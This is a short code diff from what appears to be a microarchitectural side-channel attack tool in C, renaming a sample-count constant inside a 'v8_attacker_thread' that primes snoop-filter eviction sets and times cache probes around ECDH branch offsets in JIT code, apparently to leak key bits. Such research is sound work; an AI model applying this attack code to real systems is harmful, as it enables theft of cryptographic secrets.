@@ -23,9 +23,9 @@ static char dump_dir[256];
 uintptr_t jit_func, jit_machine_code;
 uint64_t ecdh_false_branch_offset = 0x1a6a, ecdh_true_branch_offset = 0x1b7a;
 static const int max_exec_cycles = (int)1e8;
-enum { cache_line_count = 3, profile_samples = 1 << 16 };
-static uint64_t probe_time_arr[cache_line_count][profile_samples];
-static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
+enum { cache_line_count = 3, profile_iterations = 1 << 16 };
+static uint64_t probe_time_arr[cache_line_count][profile_iterations];
+static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
 static uint64_t *sample_tsc[cache_line_count];
 static uint64_t *probe_time[cache_line_count];
 static uint64_t *reload_time[cache_line_count];
@@ -105,7 +105,7 @@ void *v8_attacker_thread(void *param) {
 					prime_skx_sf_evset_ps_flush(
 					    evset, sf_chain, array_repeat, l2_repeat);
 				}
-			} while (tsc1 - tsc0 < max_exec_cycles && index < profile_samples);
+			} while (tsc1 - tsc0 < max_exec_cycles && index < profile_iterations);
 
 			log_info("Key %d slot %d find %d hits", i, slot, index);
 			if (slot == 0) {
@@ -116,7 +116,7 @@ void *v8_attacker_thread(void *param) {
 				                      sample_tsc,
 				                      probe_time,
 				                      cache_line_count,
-				                      profile_samples,
+				                      profile_iterations,
 				                      j == 0);
 			}
 			pthread_barrier_wait(&attacker_local_barrier);
